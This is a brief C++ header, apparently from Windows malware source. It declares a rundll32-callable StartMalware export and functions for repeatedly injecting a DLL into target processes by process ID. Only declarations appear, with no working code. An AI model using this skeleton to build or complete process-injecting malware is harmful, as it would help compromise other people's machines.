#pragma once

extern "C" __declspec(dllexport) void CALLBACK StartMalware(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);
BOOL RepeatInjectTargets();
BOOL InjectDll(DWORD pid, const std::wstring& dllPath);
BOOL VectorContain(std::vector<DWORD> vec, DWORD val);
